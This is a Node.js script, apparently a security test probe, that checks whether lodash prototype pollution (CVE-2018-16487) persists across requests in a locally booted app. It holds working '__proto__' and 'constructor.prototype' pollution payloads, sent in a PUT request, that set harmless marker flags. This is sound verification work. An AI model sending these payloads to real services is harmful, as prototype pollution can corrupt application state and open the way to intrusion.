// CVE-2018-16487 — lodash prototype pollution, PERSISTENCE across requests.
//
// Extends pollute_probe.js: instead of one request, it boots the app ONCE and
// in the SAME process sends two sequential requests to the same server:
//   (1) PUT /api/users/1 with a crafted `username` (pollution payload)
//   (2) a separate, unrelated GET request
// It samples a fresh {} marker before (1), after (1), and after (2), and prints
// process.pid + server address throughout to prove nothing was restarted.
//
// Usage: node persistence_probe.js <absolute-app-path/src/index.js> [proto|ctor]

const http = require('http');

const APP_PATH = process.argv[2];
const FORM = process.argv[3] || 'proto';
const PAYLOADS = {
  proto: '{"username":{"__proto__":{"polluted_proto":true}}}',
  ctor:  '{"username":{"constructor":{"prototype":{"polluted_ctor":true}}}}',
};
const MARKER = FORM === 'proto' ? 'polluted_proto' : 'polluted_ctor';
const payload = PAYLOADS[FORM];

function marker() { return ({})[MARKER]; } // read through a brand-new object

function request(opts, body) {
  return new Promise((resolve, reject) => {
    const req = http.request(opts, (res) => {
      let data = '';
      res.on('data', (d) => (data += d));
      res.on('end', () => resolve({ status: res.statusCode, body: data }));
    });
    req.on('error', reject);
    if (body) req.write(body);
    req.end();
  });
}

const app = require(APP_PATH);
const server = app.listen(0, '127.0.0.1', async () => {
  const addr = server.address();
  const base = { host: '127.0.0.1', port: addr.port };
  console.log('process.pid      :', process.pid);
  console.log('server listening :', '127.0.0.1:' + addr.port);
  console.log('form / marker    :', FORM, '/', MARKER);
  console.log('');
  console.log('[t0] before any request   ({})[' + MARKER + '] =', marker());

  // (1) the pollution request
  const r1 = await request(
    { ...base, method: 'PUT', path: '/api/users/1',
      headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) } },
    payload
  );
  console.log('');
  console.log('[req1] PUT /api/users/1   payload =', payload);
  console.log('[req1] HTTP status        :', r1.status);
  console.log('[t1] after pollution req  ({})[' + MARKER + '] =', marker());

  // (2) a SEPARATE, unrelated request — no payload, different method+path
  const r2 = await request({ ...base, method: 'GET', path: '/api/users' });
  console.log('');
  console.log('[req2] GET /api/users     (unrelated, no payload)');
  console.log('[req2] HTTP status        :', r2.status);
  console.log('[t2] after unrelated req  ({})[' + MARKER + '] =', marker());

  console.log('');
  console.log('process.pid (end) :', process.pid, '(same process — server never restarted)');
  const persisted = marker() === true;
  console.log('RESULT            :',
    persisted ? 'POLLUTION PERSISTED across an unrelated request in the same process'
              : 'not polluted / did not persist');
  server.close(() => process.exit(0));
});
